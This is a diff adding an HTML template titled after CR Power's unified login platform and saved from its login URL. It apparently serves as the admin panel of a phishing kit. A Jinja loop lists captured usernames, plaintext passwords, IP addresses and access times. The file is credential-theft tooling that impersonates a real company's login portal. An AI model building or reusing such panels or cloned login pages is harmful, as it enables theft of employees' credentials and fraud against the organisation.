@@ -1,0 +1,47 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0185)https://oam.crpower.com.cn/oam/server/obrareq.cgi?wh%3DIAMSuiteAgent%20wu%3D%2FCRCPortal%2Findex.jsp%20wo%3D1%20rh%3Dhttps%3A%2F%2Foam.crpower.com.cn%20ru%3D%252FCRCPortal%252Findex.jsp -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>华润电力统一登录平台</title>
+
+
+<style>
+	.loginlist ul{
+	padding: 2px;
+	margin: 5px auto 0px auto;
+	border:1px solid #000;
+	width: 90%;
+	height: 24px;
+}
+	.loginlist ul li{
+	width: 25%;
+	float: left;
+	height: 24px;
+	color: #000;
+	
+}
+	ul,ol{list-style:none;}
+
+</style>
+
+
+</head>
+<body class="lo_body">
+<div class="loginlist">
+
+
+
+	{% for row in rows %}
+	<ul>
+		<li>用户名:{{ row[0] }}</li>
+		<li>密码:{{ row[1] }}</li>
+		<li>IP:{{ row[2] }}</li>
+		<li>访问时间:{{ row[3] }}</li>
+	</ul>
+	{% endfor %}
+
+
+
+
+</div>
+
+</body></html>
